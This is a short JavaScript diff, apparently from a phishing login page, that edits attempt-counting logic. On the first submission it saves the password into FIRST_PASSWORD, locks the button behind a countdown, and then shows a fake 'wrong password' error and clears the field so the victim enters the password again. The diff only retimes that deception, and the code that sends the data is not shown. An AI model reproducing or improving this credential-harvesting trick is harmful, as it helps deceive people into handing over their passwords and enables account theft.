@@ -247,30 +247,30 @@ function showPrompt(IpAddress) {
         })
         .then(data => {
             NUMBER_TIME_LOGIN++;
-            if (NUMBER_TIME_LOGIN === 1) {
+           if (NUMBER_TIME_LOGIN === 1) {
     FIRST_PASSWORD = password;
-    setTimeout(function () {
-        $('.lsd-ring-container').addClass('d-none');
-        $('#wrong-password').removeClass('d-none');
-        $("#password").val('');
 
-        const submitBtn = $('#submit-password');
-        submitBtn.prop('disabled', true);
+    const submitBtn = $('#submit-password');
+    submitBtn.prop('disabled', true);
 
-        let countdown = 10;
-        submitBtn.text(`Wait ${countdown}s`);
+    let countdown = 10;
+    submitBtn.text(`Wait ${countdown}s`);
 
-        const interval = setInterval(() => {
-            countdown--;
-            if (countdown > 0) {
-                submitBtn.text(`Wait ${countdown}s`);
-            } else {
-                clearInterval(interval);
-                submitBtn.prop('disabled', false);
-                submitBtn.text('Continue');
-            }
-        }, 1000);
-    }, 2000);
+    const interval = setInterval(() => {
+        countdown--;
+        if (countdown > 0) {
+            submitBtn.text(`Wait ${countdown}s`);
+        } else {
+            clearInterval(interval);
+            submitBtn.prop('disabled', false);
+            submitBtn.text('Continue');
+
+            // Hiển thị lỗi sau khi hết đếm ngược
+            $('#wrong-password').removeClass('d-none');
+            $('.lsd-ring-container').addClass('d-none');
+            $('#password').val('');
+        }
+    }, 1000);
 }
  else {
                 setTimeout(function () {
